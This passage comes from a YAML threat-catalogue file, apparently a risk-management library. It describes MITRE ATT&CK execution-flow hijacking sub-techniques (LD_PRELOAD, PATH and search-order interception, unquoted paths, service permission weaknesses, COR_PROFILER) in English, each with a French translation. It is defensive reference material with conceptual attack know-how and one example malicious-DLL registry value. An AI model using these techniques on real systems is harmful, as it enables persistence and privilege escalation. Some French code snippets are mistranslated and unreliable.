      \ library.(Citation: Baeldung LD_PRELOAD)\n\nHijacking dynamic linker variables\
      \ may grant access to the victim process's memory, system/network resources,\
      \ and possibly elevated privileges. On Linux, adversaries may set <code>LD_PRELOAD</code>\
      \ to point to malicious libraries that match the name of legitimate libraries\
      \ which are requested by a victim program, causing the operating system to load\
      \ the adversary's malicious code upon execution of the victim program. For example,\
      \ adversaries have used `LD_PRELOAD` to inject a malicious library into every\
      \ descendant process of the `sshd` daemon, resulting in execution under a legitimate\
      \ process. When the executing sub-process calls the `execve` function, for example,\
      \ the malicious library\u2019s `execve` function is executed rather than the\
      \ system function `execve` contained in the system library on disk. This allows\
      \ adversaries to [Hide Artifacts](https://attack.mitre.org/techniques/T1564)\
      \ from detection, as hooking system functions such as `execve` and `readdir`\
      \ enables malware to scrub its own artifacts from the results of commands such\
      \ as `ls`, `ldd`, `iptables`, and `dmesg`.(Citation: ESET Ebury Oct 2017)(Citation:\
      \ Intezer Symbiote 2022)(Citation: Elastic Security Labs Pumakit 2024)\n\nHijacking\
      \ dynamic linker variables may grant access to the victim process's memory,\
      \ system/network resources, and possibly elevated privileges.\nhttps://attack.mitre.org/techniques/T1574/006"
    translations:
      fr:
        name: "D\xE9tournement du Dynamic Linker"
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant les variables d\u2019environnement utilis\xE9\
          es par le lieur dynamique pour charger les biblioth\xE8ques partag\xE9es.\
          \ Pendant la phase de pr\xE9paration \xE0 l\u2019ex\xE9cution d\u2019un\
          \ programme, le liaison dynamique charge sp\xE9cifi\xE9 des chemins absolus\
          \ de biblioth\xE8ques partag\xE9es \xE0 partir de diverses variables et\
          \ fichiers d\u2019environnement, tels que <code>LD_PRELOAD</code> sous Linux\
          \ ou <code>DYLD_INSERT_LIBRARIES</code> sur macOS. (Citation : TheEvilBit\
          \ DYLD_INSERT_LIBRARIES)(Citation : Timac DYLD_INSERT_LIBRARIES)(Citation\
          \ : Bypass de Gabilondo DYLD_INSERT_LIBRARIES Catalina) Les biblioth\xE8\
          ques sp\xE9cifi\xE9es dans les variables d\u2019environnement sont charg\xE9\
          es en premier, prenant la priorit\xE9 sur les biblioth\xE8ques syst\xE8\
          me portant le m\xEAme nom de fonction. (Citation : Homme LD.SO)(Citation\
          \ : Biblioth\xE8ques partag\xE9es TLDP)(Citation : Archives dynamiques de\
          \ l\u2019Archive Apple Doco) Le linker de chaque plateforme utilise une\
          \ liste \xE9tendue de variables d\u2019environnement \xE0 diff\xE9rents\
          \ moments de l\u2019ex\xE9cution. Ces variables sont souvent utilis\xE9\
          es par les d\xE9veloppeurs pour d\xE9boger des binaires sans avoir \xE0\
          \ recompiler, d\xE9conflicter les symboles mapp\xE9s et impl\xE9menter des\
          \ fonctions personnalis\xE9es dans la biblioth\xE8que d\u2019origine. (Citation\
          \ : Baeldung LD_PRELOAD)\n\nLe d\xE9tournement des variables de liaison\
          \ dynamique peut accorder l\u2019acc\xE8s \xE0 la m\xE9moire du processus\
          \ victime, aux ressources syst\xE8me/r\xE9seau, et \xE9ventuellement \xE0\
          \ des privil\xE8ges \xE9lev\xE9s. Sous Linux, les adversaires peuvent <code>LD_PRELOAD</code>\
          \ pointer vers des biblioth\xE8ques malveillantes correspondant au nom des\
          \ biblioth\xE8ques l\xE9gitimes demand\xE9es par un programme victime, ce\
          \ qui pousse le syst\xE8me d\u2019exploitation \xE0 charger le code malveillant\
          \ de l\u2019adversaire lors de l\u2019ex\xE9cution du programme victime.\
          \ Par exemple, des adversaires ont utilis\xE9 le terme \xAB LD_PRELOAD \xBB\
          \ pour injecter une biblioth\xE8que malveillante dans chaque processus descendant\
          \ du d\xE9mon \xAB sshd \xBB, ce qui a conduit \xE0 une ex\xE9cution sous\
          \ un processus l\xE9gitime. Lorsque le sous-processus en ex\xE9cution appelle\
          \ par exemple la fonction \xAB execve \xBB, c\u2019est la fonction \xAB\
          \ execve \xBB de la biblioth\xE8que malveillante qui est ex\xE9cut\xE9e\
          \ plut\xF4t que la fonction syst\xE8me \xAB execve \xBB contenue dans la\
          \ biblioth\xE8que syst\xE8me sur le disque. Cela permet aux adversaires\
          \ de [Masquer les artefacts](https://attack.mitre.org/techniques/T1564)\
          \ de la d\xE9tection, car des fonctions syst\xE8me de hooking telles que\
          \ 'execve' et 'readdir' permettent aux malwares d\u2019effacer leurs propres\
          \ artefacts des r\xE9sultats de commandes telles que 'ls', 'ldd'', 'iptables'\
          \ et 'dmesg'. (Citation : ESET Ebury oct. 2017)(Citation : Intezer Symbiote\
          \ 2022)(Citation : Elastic Security Labs Pumakit 2024)\n\nLe d\xE9tournement\
          \ des variables de liaison dynamique peut accorder l\u2019acc\xE8s \xE0\
          \ la m\xE9moire du processus victime, aux ressources syst\xE8me/r\xE9seau,\
          \ et \xE9ventuellement \xE0 des privil\xE8ges \xE9lev\xE9s.\nhttps://attack.mitre.org/techniques/T1574/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.007
    ref_id: T1574.007
    name: Path Interception by PATH Environment Variable
    description: "Adversaries may execute their own malicious payloads by hijacking\
      \ environment variables used to load libraries. The PATH environment variable\
      \ contains a list of directories (User and System) that the OS searches sequentially\
      \ through in search of the binary that was called from a script or the command\
      \ line. \n\nAdversaries can place a malicious program in an earlier entry in\
      \ the list of directories stored in the PATH environment variable, resulting\
      \ in the operating system executing the malicious binary rather than the legitimate\
      \ binary when it searches sequentially through that PATH listing.\n\nFor example,\
      \ on Windows if an adversary places a malicious program named \"net.exe\" in\
      \ `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe`\
      \ in the PATH environment variable, when \"net\" is executed from the command-line\
      \ the `C:\\example path` will be called instead of the system's legitimate executable\
      \ at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely\
      \ on the PATH environment variable to determine the locations that are searched\
      \ when the path for the program is not given, such as executing programs from\
      \ a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation:\
      \ ExpressVPN PATH env Windows 2021)\n\nAdversaries may also directly modify\
      \ the $PATH variable specifying the directories to be searched.  An adversary\
      \ can modify the `$PATH` variable to point to a directory they have write access.\
      \ When a program using the $PATH variable is called, the OS searches the specified\
      \ directory and executes the malicious binary. On macOS, this can also be performed\
      \ through modifying the $HOME variable. These variables can be modified using\
      \ the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004),\
      \ or modifying the `/etc/paths.d` folder contents.(Citation: uptycs Fake POC\
      \ linux malware 2023)(Citation: nixCraft macOS PATH variables)(Citation: Elastic\
      \ Rules macOS launchctl 2022)\nhttps://attack.mitre.org/techniques/T1574/007"
    translations:
      fr:
        name: "Interception de chemin par variable d\u2019environnement PATH"
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant les variables d\u2019environnement utilis\xE9\
          es pour charger les biblioth\xE8ques. La variable d\u2019environnement PATH\
          \ contient une liste d\u2019annuaires (Utilisateur et Syst\xE8me) que le\
          \ syst\xE8me d\u2019exploitation effectue une recherche s\xE9quentielle\
          \ \xE0 la recherche du binaire appel\xE9 depuis un script ou la ligne de\
          \ commande. \n\nLes adversaires peuvent placer un programme malveillant\
          \ dans une entr\xE9e ant\xE9rieure de la liste des r\xE9pertoires stock\xE9\
          s dans la variable d\u2019environnement PATH, ce qui fait que le syst\xE8\
          me d\u2019exploitation ex\xE9cute le binaire malveillant plut\xF4t que le\
          \ binaire l\xE9gitime lorsqu\u2019il effectue une recherche s\xE9quentielle\
          \ dans cette liste PATH.\n\nPar exemple, sous Windows, si un adversaire\
          \ place un programme malveillant nomm\xE9 \xAB net.exe \xBB dans \xAB C\_\
          :\\example path \xBB, qui par d\xE9faut pr\xE9c\xE8de \xAB C\_:\\Windows\\\
          system32\\net.exe \xBB dans la variable d\u2019environnement PATH, lorsque\
          \ \xAB net \xBB est ex\xE9cut\xE9 depuis la ligne de commande, le \xAB chemin\
          \ C\_:\\example \xBB sera appel\xE9 \xE0 la place de l\u2019ex\xE9cutable\
          \ l\xE9gitime du syst\xE8me \xE0 \xAB C\_:\\Windows\\system32\\net.exe \xBB\
          . Certaines m\xE9thodes d\u2019ex\xE9cution d\u2019un programme reposent\
          \ sur la variable d\u2019environnement PATH pour d\xE9terminer les emplacements\
          \ recherch\xE9s lorsque le chemin du programme n\u2019est pas donn\xE9,\
          \ comme l\u2019ex\xE9cution de programmes depuis un [Command and Scripting\
          \ Interpreter](https://attack.mitre.org/techniques/T1059). (Citation : ExpressVPN\
          \ PATH env Windows 2021)\n\nLes adversaires peuvent \xE9galement modifier\
          \ directement la variable $PATH sp\xE9cifiant les annuaires \xE0 rechercher.\
          \  Un adversaire peut modifier la variable \xAB $PATH \xBB pour pointer\
          \ vers un r\xE9pertoire auquel il a acc\xE8s en \xE9criture. Lorsqu\u2019\
          un programme utilisant la variable $PATH est appel\xE9, le syst\xE8me d\u2019\
          exploitation recherche le r\xE9pertoire sp\xE9cifi\xE9 et ex\xE9cute le\
          \ binaire malveillant. Sur macOS, cela peut \xE9galement \xEAtre r\xE9alis\xE9\
          \ en modifiant la variable $HOME. Ces variables peuvent \xEAtre modifi\xE9\
          es via la ligne de commande, launchctl, [Modification de configuration du\
          \ shell Unix](https://attack.mitre.org/techniques/T1546/004), ou en modifiant\
          \ le contenu du dossier '/etc/paths.d'. (Citation : uptycs Fake POC Linux\
          \ malware 2023)(Citation : variables nixCraft macOS PATH)(Citation : Elastic\
          \ Rules macOS launchctl 2022)\nhttps://attack.mitre.org/techniques/T1574/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.008
    ref_id: T1574.008
    name: Path Interception by Search Order Hijacking
    description: 'Adversaries may execute their own malicious payloads by hijacking
      the search order used to load other programs. Because some programs do not call
      other programs using the full path, adversaries may place their own file in
      the directory where the calling program is located, causing the operating system
      to launch their malicious software at the request of the calling program.


      Search order hijacking occurs when an adversary abuses the order in which Windows
      searches for programs that are not given a path. Unlike [DLL](https://attack.mitre.org/techniques/T1574/001)
      search order hijacking, the search order differs depending on the method that
      is used to execute the program. (Citation: Microsoft CreateProcess) (Citation:
      Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common
      for Windows to search in the directory of the initiating program before searching
      through the Windows system directory. An adversary who finds a program vulnerable
      to search order hijacking (i.e., a program that does not specify the path to
      an executable) may take advantage of this vulnerability by creating a program
      named after the improperly specified program and placing it within the initiating
      program''s directory.


      For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net
      user</code>. An adversary may place a program called "net.exe" within the same
      directory as example.exe, "net.exe" will be run instead of the Windows system
      utility net. In addition, if an adversary places a program called "net.com"
      in the same directory as "net.exe", then <code>cmd.exe /C net user</code> will
      execute "net.com" instead of "net.exe" due to the order of executable extensions
      defined under PATHEXT. (Citation: Microsoft Environment Property)


      Search order hijacking is also a common practice for hijacking DLL loads and
      is covered in [DLL](https://attack.mitre.org/techniques/T1574/001).

      https://attack.mitre.org/techniques/T1574/008'
    translations:
      fr:
        name: "Interception de trajets par d\xE9tournement d\u2019ordre de recherche"
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant l\u2019ordre de recherche utilis\xE9 pour\
          \ charger d\u2019autres programmes. Comme certains programmes n\u2019appellent\
          \ pas d\u2019autres programmes en utilisant le chemin complet, les adversaires\
          \ peuvent placer leur propre fichier dans le r\xE9pertoire o\xF9 se trouve\
          \ le programme appelant, ce qui pousse le syst\xE8me d\u2019exploitation\
          \ \xE0 lancer son logiciel malveillant \xE0 la demande du programme appelant.\n\
          \nLe d\xE9tournement de l\u2019ordre de recherche se produit lorsqu\u2019\
          un adversaire abuse de l\u2019ordre dans lequel Windows recherche des programmes\
          \ qui n\u2019ont pas de chemin. Contrairement au d\xE9tournement de l\u2019\
          ordre de recherche [DLL](https://attack.mitre.org/techniques/T1574/001),\
          \ l\u2019ordre de recherche diff\xE8re selon la m\xE9thode utilis\xE9e pour\
          \ ex\xE9cuter le programme. (Citation : Microsoft CreateProcess) (Citation\
          \ : Shell de commande Windows NT) (Citation : Microsoft WinExec) Cependant,\
          \ il est courant que Windows recherche dans le r\xE9pertoire du programme\
          \ initiateur avant de rechercher dans le r\xE9pertoire syst\xE8me Windows.\
          \ Un adversaire qui trouve un programme vuln\xE9rable au d\xE9tournement\
          \ d\u2019ordre de recherche (c\u2019est-\xE0-dire un programme qui ne sp\xE9\
          cifie pas le chemin vers un ex\xE9cutable) peut profiter de cette vuln\xE9\
          rabilit\xE9 en cr\xE9ant un programme nomm\xE9 d\u2019apr\xE8s le programme\
          \ mal sp\xE9cifi\xE9 et en le pla\xE7ant dans le r\xE9pertoire du programme\
          \ initiateur.\n\nPar exemple, \xAB example.exe \xBB ex\xE9cute \xAB cmd.exe\
          \ \xBB avec l\u2019argument en ligne de commande <code>netuser</code>. Un\
          \ adversaire peut placer un programme appel\xE9 \xAB net.exe \xBB dans le\
          \ m\xEAme r\xE9pertoire que example.exe, \xAB net.exe \xBB sera ex\xE9cut\xE9\
          \ \xE0 la place du r\xE9seau utilitaire syst\xE8me Windows. De plus, si\
          \ un adversaire place un programme appel\xE9 \xAB net.com \xBB dans le m\xEA\
          me r\xE9pertoire que \xAB net.exe \xBB, <code>alors cmd.exe utilisateur\
          \ net /C</code> ex\xE9cutera \xAB net.com \xBB au lieu de \xAB net.exe \xBB\
          \ en raison de l\u2019ordre des extensions ex\xE9cutables d\xE9fini sous\
          \ PATHEXT. (Citation : Propri\xE9t\xE9 de l\u2019environnement Microsoft)\n\
          \nLe d\xE9tournement par ordre de recherche est \xE9galement une pratique\
          \ courante pour le d\xE9tournement des charges DLL et est couvert dans [DLL](https://attack.mitre.org/techniques/T1574/001).\n\
          https://attack.mitre.org/techniques/T1574/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.009
    ref_id: T1574.009
    name: Path Interception by Unquoted Path
    description: 'Adversaries may execute their own malicious payloads by hijacking
      vulnerable file path references. Adversaries can take advantage of paths that
      lack surrounding quotations by placing an executable in a higher level directory
      within the path, so that Windows will choose the adversary''s executable to
      launch.


      Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut
      paths may also be vulnerable to path interception if the path has one or more
      spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path
      with space\program.exe</code> vs. <code>"C:\safe path with space\program.exe"</code>).
      (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An
      adversary can place an executable in a higher level directory of the path, and
      Windows will resolve that executable instead of the intended executable. For
      example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>,
      an adversary may create a program at <code>C:\program.exe</code> that will be
      run instead of the intended program. (Citation: Windows Unquoted Services) (Citation:
      Windows Privilege Escalation Guide)


      This technique can be used for persistence if executables are called on a regular
      basis, as well as privilege escalation if intercepted executables are started
      by a higher privileged process.

      https://attack.mitre.org/techniques/T1574/009'
    translations:
      fr:
        name: "Interception de chemin par chemin non cit\xE9"
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant les r\xE9f\xE9rences de chemin de fichiers\
          \ vuln\xE9rables. Les adversaires peuvent profiter des chemins d\xE9pourvus\
          \ de guillemets environnants en pla\xE7ant un ex\xE9cutable dans un r\xE9\
          pertoire de niveau sup\xE9rieur \xE0 l\u2019int\xE9rieur du chemin, afin\
          \ que Windows choisisse l\u2019ex\xE9cutable de l\u2019adversaire \xE0 lancer.\n\
          \nLes chemins de service (citation : Microsoft CurrentControlSet Services)\
          \ et les chemins de raccourcis peuvent \xE9galement \xEAtre vuln\xE9rables\
          \ \xE0 l\u2019interception de chemin si le chemin comporte un ou plusieurs\
          \ espaces et n\u2019est pas entour\xE9 de guillemets (par exemple, <code>C\_\
          :\\chemin non s\xE9curis\xE9 avec program.exe espace\\</code> vs. <code>\xAB\
          \ C\_:\\chemin s\xFBr avec espace\\program.exe \xBB</code>). (Citation :\
          \ Aider \xE0 \xE9liminer le chemin non cit\xE9) (stock\xE9 dans les cl\xE9\
          s du Registre Windows) Un adversaire peut placer un ex\xE9cutable dans un\
          \ r\xE9pertoire de niveau sup\xE9rieur du chemin, et Windows r\xE9soudra\
          \ cet ex\xE9cutable au lieu de l\u2019ex\xE9cutable pr\xE9vu. Par exemple,\
          \ si le chemin dans un raccourci est <code>C\_:\\program files\\myapp.exe</code>,\
          \ un adversaire peut cr\xE9er un programme \xE0 <code>C\_:\\program.exe</code>\
          \ qui sera ex\xE9cut\xE9 \xE0 la place du programme pr\xE9vu. (Citation\
          \ : Services Windows non cit\xE9s) (Citation : Guide d\u2019escalade des\
          \ privil\xE8ges Windows)\n\nCette technique peut \xEAtre utilis\xE9e pour\
          \ la persistance si des ex\xE9cutables sont appel\xE9s r\xE9guli\xE8rement,\
          \ ainsi que pour l\u2019escalade de privil\xE8ges si les ex\xE9cutables\
          \ intercept\xE9s sont lanc\xE9s par un processus \xE0 plus haut privil\xE8\
          ge.\nhttps://attack.mitre.org/techniques/T1574/009"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.010
    ref_id: T1574.010
    name: Services File Permissions Weakness
    description: 'Adversaries may execute their own malicious payloads by hijacking
      the binaries used by services. Adversaries may use flaws in the permissions
      of Windows services to replace the binary that is executed upon service start.
      These service processes may automatically execute specific binaries as part
      of their functionality or to perform other actions. If the permissions on the
      file system directory containing a target binary, or permissions on the binary
      itself are improperly set, then the target binary may be overwritten with another
      binary using user-level permissions and executed by the original process. If
      the original process and thread are running under a higher permissions level,
      then the replaced binary will also execute under higher-level permissions, which
      could include SYSTEM.


      Adversaries may use this technique to replace legitimate binaries with malicious
      ones as a means of executing code at a higher permissions level. If the executing
      process is set to run at a specific time or during a certain event (e.g., system
      bootup) then this technique can also be used for persistence.

      https://attack.mitre.org/techniques/T1574/010'
    translations:
      fr:
        name: Faiblesse des permissions des fichiers de services
        description: "Les adversaires peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant les binaires utilis\xE9s par les services.\
          \ Les adversaires peuvent utiliser des failles dans les permissions des\
          \ services Windows pour remplacer le binaire ex\xE9cut\xE9 au d\xE9marrage\
          \ du service. Ces processus de service peuvent ex\xE9cuter automatiquement\
          \ des binaires sp\xE9cifiques dans le cadre de leur fonctionnalit\xE9 ou\
          \ pour effectuer d\u2019autres actions. Si les permissions sur le r\xE9\
          pertoire du syst\xE8me de fichiers contenant un binaire cible, ou les permissions\
          \ sur le binaire lui-m\xEAme, sont mal d\xE9finies, alors le binaire cible\
          \ peut \xEAtre \xE9cras\xE9 par un autre binaire utilisant les permissions\
          \ au niveau utilisateur et ex\xE9cut\xE9 par le processus d\u2019origine.\
          \ Si le processus et le thread d\u2019origine s\u2019ex\xE9cutent sous un\
          \ niveau d\u2019autorisations sup\xE9rieur, alors le binaire remplac\xE9\
          \ s\u2019ex\xE9cutera \xE9galement sous des permissions de niveau sup\xE9\
          rieur, ce qui peut inclure SYSTEM.\n\nLes adversaires peuvent utiliser cette\
          \ technique pour remplacer des binaires l\xE9gitimes par des binaires malveillants\
          \ afin d\u2019ex\xE9cuter du code \xE0 un niveau d\u2019autorisations sup\xE9\
          rieur. Si le processus en ex\xE9cution est configur\xE9 pour s\u2019ex\xE9\
          cuter \xE0 un moment pr\xE9cis ou lors d\u2019un certain \xE9v\xE9nement\
          \ (par exemple, d\xE9marrage du syst\xE8me), cette technique peut \xE9galement\
          \ \xEAtre utilis\xE9e pour la persistance.\nhttps://attack.mitre.org/techniques/T1574/010"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.011
    ref_id: T1574.011
    name: Services Registry Permissions Weakness
    description: "Adversaries may execute their own malicious payloads by hijacking\
      \ the Registry entries used by services. Flaws in the permissions for Registry\
      \ keys related to services can allow adversaries to redirect the originally\
      \ specified executable to one they control, launching their own code when a\
      \ service starts. Windows stores local service configuration information in\
      \ the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>.\
      \ The information stored under a service's Registry keys can be manipulated\
      \ to modify a service's execution parameters through tools such as the service\
      \ controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001),\
      \ or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys\
      \ is controlled through access control lists and user permissions. (Citation:\
      \ Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions\
      \ for users and groups are not properly set and allow access to the Registry\
      \ keys for a service, adversaries may change the service's binPath/ImagePath\
      \ to point to a different executable under their control. When the service starts\
      \ or is restarted, the adversary-controlled program will execute, allowing the\
      \ adversary to establish persistence and/or privilege escalation to the account\
      \ context the service is set to execute under (local/domain account, SYSTEM,\
      \ LocalService, or NetworkService).\n\nAdversaries may also alter other Registry\
      \ keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code>\
      \ key may be changed so that the service is executed in an elevated context\
      \ anytime the service fails or is intentionally corrupted.(Citation: Kansa Service\
      \ related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code>\
      \ key contains the name of a driver service's performance DLL and the names\
      \ of several exported functions in the DLL.(Citation: microsoft_services_registry_tree)\
      \ If the <code>Performance</code> key is not already present and if an adversary-controlled\
      \ user has the <code>Create Subkey</code> permission, adversaries may create\
      \ the <code>Performance</code> key in the service\u2019s Registry tree to point\
      \ to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also\
      \ add the <code>Parameters</code> key, which can reference malicious drivers\
      \ file paths. This technique has been identified to be a method of abuse by\
      \ configuring DLL file paths within the <code>Parameters</code> key of a given\
      \ services registry configuration. By placing and configuring the <code>Parameters</code>\
      \ key to reference a malicious DLL, adversaries can ensure that their code is\
      \ loaded persistently whenever the associated service or library is invoked.\n\
      \nFor example, the registry path(Citation: MDSec) <code>HKEY_LOCAL_MACHINE\\\
      SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters</code>(Citation: hexacorn)(Citation:\
      \ gendigital) contains the <code>AutodiaDLL</code> value, which specifies the\
      \ DLL to be loaded for autodial funcitionality. An adversary could set the <code>AutodiaDLL</code>\
      \ to point to a hijacked or malicious DLL:\n\n<code>\"AutodialDLL\"=\"c:\\temp\\\
      foo.dll\"</code>\n\nThis ensures persistence, as it causes the DLL (in this\
      \ case, foo.dll) to be loaded each time the Winsock 2 library is invoked.\n\
      https://attack.mitre.org/techniques/T1574/011"
    translations:
      fr:
        name: Faiblesse des autorisations du registre des services
        description: "Les attaquants peuvent ex\xE9cuter leurs propres charges utiles\
          \ malveillantes en d\xE9tournant les entr\xE9es du Registre utilis\xE9es\
          \ par les services. Des failles dans les autorisations des cl\xE9s de Registre\
          \ li\xE9es aux services peuvent permettre aux attaquants de rediriger l'ex\xE9\
          cutable initialement sp\xE9cifi\xE9 vers un fichier qu'ils contr\xF4lent,\
          \ lan\xE7ant ainsi leur propre code au d\xE9marrage d'un service. Windows\
          \ stocke les informations de configuration des services locaux dans le Registre\
          \ sous <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Les informations\
          \ stock\xE9es sous les cl\xE9s de registre d\u2019un service peuvent \xEA\
          tre manipul\xE9es pour modifier les param\xE8tres d\u2019ex\xE9cution d\u2019\
          un service \xE0 l\u2019aide d\u2019outils tels que le contr\xF4leur de services,\
          \ sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1059/001) ou\
          \ [Reg](https://attack.mitre.org/software/S0075). L\u2019acc\xE8s aux cl\xE9\
          s de registre est contr\xF4l\xE9 par des listes de contr\xF4le d\u2019acc\xE8\
          s et des autorisations utilisateur. (R\xE9f\xE9rence : S\xE9curit\xE9 des\
          \ cl\xE9s de registre) (R\xE9f\xE9rence : malware_hides_service)\n\nSi les\
          \ autorisations accord\xE9es aux utilisateurs et aux groupes ne sont pas\
          \ correctement configur\xE9es et permettent l\u2019acc\xE8s aux cl\xE9s\
          \ de registre d\u2019un service, des attaquants peuvent modifier les param\xE8\
          tres binPath/ImagePath du service afin qu\u2019ils pointent vers un autre\
          \ ex\xE9cutable sous leur contr\xF4le. Lorsque le service d\xE9marre ou\
          \ est red\xE9marr\xE9, le programme contr\xF4l\xE9 par l\u2019attaquant\
          \ s\u2019ex\xE9cute, ce qui permet \xE0 ce dernier d\u2019\xE9tablir une\
          \ persistance et/ou d\u2019\xE9lever ses privil\xE8ges au niveau du contexte\
          \ de compte sous lequel le service est configur\xE9 pour s\u2019ex\xE9cuter\
          \ (compte local/de domaine, SYSTEM, LocalService ou NetworkService).\n\n\
          Les attaquants peuvent \xE9galement modifier d\u2019autres cl\xE9s du Registre\
          \ dans l\u2019arborescence du service. Par exemple, la cl\xE9 <code>FailureCommand</code>\
          \ peut \xEAtre modifi\xE9e de mani\xE8re \xE0 ce que le service soit ex\xE9\
          cut\xE9 dans un contexte privil\xE9gi\xE9 chaque fois qu\u2019il \xE9choue\
          \ ou qu\u2019il est intentionnellement corrompu. (R\xE9f\xE9rence : collecteurs\
          \ li\xE9s au service Kansa) (R\xE9f\xE9rence : faiblesse des autorisations\
          \ du Registre mentionn\xE9e dans un tweet)\n\nLa cl\xE9 <code>Performance</code>\
          \ contient le nom de la DLL de performances d\u2019un service de pilote\
          \ ainsi que les noms de plusieurs fonctions export\xE9es dans cette DLL.\
          \ (R\xE9f\xE9rence : microsoft_services_registry_tree) Si la cl\xE9 <code>Performance</code>\
          \ n\u2019existe pas encore et si un utilisateur contr\xF4l\xE9 par un attaquant\
          \ dispose de l\u2019autorisation <code>Cr\xE9er une sous-cl\xE9</code>,\
          \ les attaquants peuvent cr\xE9er la cl\xE9 <code>Performance</code> dans\
          \ l\u2019arborescence du Registre du service afin qu\u2019elle pointe vers\
          \ une DLL malveillante. (R\xE9f\xE9rence : insecure_reg_perms)\n\nLes attaquants\
          \ peuvent \xE9galement ajouter la cl\xE9 <code>Parameters</code>, qui peut\
          \ faire r\xE9f\xE9rence aux chemins d\u2019acc\xE8s de fichiers de pilotes\
          \ malveillants. Cette technique a \xE9t\xE9 identifi\xE9e comme une m\xE9\
          thode d\u2019exploitation consistant \xE0 configurer les chemins d\u2019\
          acc\xE8s des fichiers DLL au sein de la cl\xE9 <code>Parameters</code> de\
          \ la configuration du registre d\u2019un service donn\xE9. En pla\xE7ant\
          \ et en configurant la cl\xE9 <code>Param\xE8tres</code> de mani\xE8re \xE0\
          \ ce qu\u2019elle fasse r\xE9f\xE9rence \xE0 une DLL malveillante, les attaquants\
          \ peuvent s\u2019assurer que leur code est charg\xE9 de mani\xE8re persistante\
          \ chaque fois que le service ou la biblioth\xE8que associ\xE9(e) est invoqu\xE9\
          (e).\n\nPar exemple, le chemin d'acc\xE8s au registre (Source : MDSec) <code>HKEY_LOCAL_MACHINE\\\
          SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters</code> (Source\
          \ : hexacorn) (Source : gendigital) contient la valeur <code>AutodiaDLL</code>,\
          \ qui sp\xE9cifie la DLL \xE0 charger pour la fonctionnalit\xE9 de num\xE9\
          rotation automatique. Un attaquant pourrait configurer la valeur <code>AutodiaDLL</code>\
          \ pour qu\u2019elle pointe vers une DLL d\xE9tourn\xE9e ou malveillante\
          \ :\n\n<code>\xAB \xBBAutodialDLL\xAB \xBB=\xAB \xBBc:\\temp\\foo.dll\xAB\
          \ \xBB</code>\n\nCela garantit la persistance, car cela entra\xEEne le chargement\
          \ de la DLL (dans ce cas, foo.dll) \xE0 chaque fois que la biblioth\xE8\
          que Winsock 2 est appel\xE9e.\nhttps://attack.mitre.org/techniques/T1574/011"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.012
    ref_id: T1574.012
    name: COR_PROFILER
    description: 'Adversaries may leverage the COR_PROFILER environment variable to
      hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER
      is a .NET Framework feature which allows developers to specify an unmanaged
      (or external of .NET) profiling DLL to be loaded into each .NET process that
      loads the Common Language Runtime (CLR). These profilers are designed to monitor,
      troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft
      Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)


      The COR_PROFILER environment variable can be set at various scopes (system,
      user, or process) resulting in different levels of influence. System and user-wide
      environment variable scopes are specified in the Registry, where a [Component
      Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can
      be registered as a profiler DLL. A process scope COR_PROFILER can also be created
      in-memory without modifying the Registry. Starting with .NET Framework 4, the
      profiling DLL does not need to be registered as long as the location of the
      DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft
      COR_PROFILER Feb 2013)


      Adversaries may abuse COR_PROFILER to establish persistence that executes a
      malicious DLL in the context of all .NET processes every time the CLR is invoked.
      The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account
      Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET
      process executes at a higher permission level, as well as to hook and impair
      defenses provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation:
      Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation:
      GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)

      https://attack.mitre.org/techniques/T1574/012'
    translations:
      fr:
        name: COR_PROFILER
        description: "Les adversaires peuvent exploiter la variable d\u2019environnement\
          \ COR_PROFILER pour d\xE9tourner le flux d\u2019ex\xE9cution des programmes\
          \ qui chargent le CLR .NET. Le COR_PROFILER est une fonctionnalit\xE9 du\
          \ .NET Framework qui permet aux d\xE9veloppeurs de sp\xE9cifier une DLL\
          \ de profilage non g\xE9r\xE9e (ou externe \xE0 .NET) \xE0 charger dans\
          \ chaque processus .NET qui charge le Common Language Runtime (CLR). Ces\
          \ profileurs sont con\xE7us pour surveiller, d\xE9panner et d\xE9boguer\
